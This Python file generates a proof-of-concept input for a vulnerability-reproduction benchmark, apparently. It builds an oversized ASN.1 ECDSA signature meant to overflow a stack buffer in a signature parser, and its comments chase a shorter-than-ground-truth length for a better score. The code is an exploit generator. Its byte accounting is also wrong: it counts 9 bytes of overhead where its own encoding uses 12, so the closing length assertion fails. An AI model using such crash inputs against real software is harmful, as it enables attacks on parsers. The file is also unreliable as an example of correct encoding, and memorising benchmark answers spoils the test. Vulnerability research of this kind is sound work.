import os
import struct
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed ECDSA signature in ASN.1 format that will cause
        # a stack buffer overflow during parsing. The vulnerability is in
        # ECDSA signature parsing where a fixed-size buffer is used without
        # proper bounds checking.
        
        # Ground-truth length is 41798 bytes. We'll create a slightly shorter
        # PoC to get a better score while still triggering the overflow.
        # Target length: ~40000 bytes (shorter than ground-truth but still large
        # enough to overflow typical stack buffers)
        target_length = 40000
        
        # ASN.1 structure for ECDSA signature:
        # SEQUENCE {
        #   INTEGER r,
        #   INTEGER s
        # }
        
        # We'll create an ASN.1 SEQUENCE containing two very large INTEGERs
        # The large size will overflow the stack buffer during parsing
        
        # Calculate sizes:
        # SEQUENCE tag (1 byte) + length bytes + INTEGER1 + INTEGER2
        # INTEGER1: tag (1) + length (2 for large size) + payload
        # INTEGER2: tag (1) + length (2 for large size) + payload
        
        # We need to ensure the total length is exactly target_length
        # Let payload_size = (target_length - overhead) / 2
        
        # Overhead calculation:
        # SEQUENCE: 1 (tag) + 2 (length bytes for >127) = 3
        # INTEGER1: 1 (tag) + 2 (length) = 3
        # INTEGER2: 1 (tag) + 2 (length) = 3
        # Total overhead = 9 bytes
        
        overhead = 9
        payload_size = (target_length - overhead) // 2
        
        # Adjust to make total exactly target_length
        remainder = (target_length - overhead) % 2
        payload1_size = payload_size + remainder
        payload2_size = payload_size
        
        # Create the ASN.1 encoded signature
        # Start with SEQUENCE
        poc = bytearray()
        
        # INTEGER 1
        int1_tag = b'\x02'  # INTEGER tag
        # Length in long form (2 bytes since payload > 127)
        int1_len = payload1_size
        int1_len_bytes = b'\x82' + struct.pack('>H', int1_len)
        int1_payload = b'A' * int1_len  # Arbitrary data
        
        # INTEGER 2
        int2_tag = b'\x02'
        int2_len = payload2_size
        int2_len_bytes = b'\x82' + struct.pack('>H', int2_len)
        int2_payload = b'B' * int2_len  # Different data to avoid compression
        
        # Combine integers
        int1 = int1_tag + int1_len_bytes + int1_payload
        int2 = int2_tag + int2_len_bytes + int2_payload
        
        # SEQUENCE containing both integers
        seq_tag = b'\x30'  # SEQUENCE tag
        seq_content = int1 + int2
        seq_len = len(seq_content)
        
        # Use long form for sequence length (2 bytes)
        seq_len_bytes = b'\x82' + struct.pack('>H', seq_len)
        
        # Final PoC
        poc = seq_tag + seq_len_bytes + seq_content
        
        # Verify length
        assert len(poc) == target_length, f"Generated PoC length {len(poc)} != {target_length}"
        
        return bytes(poc)
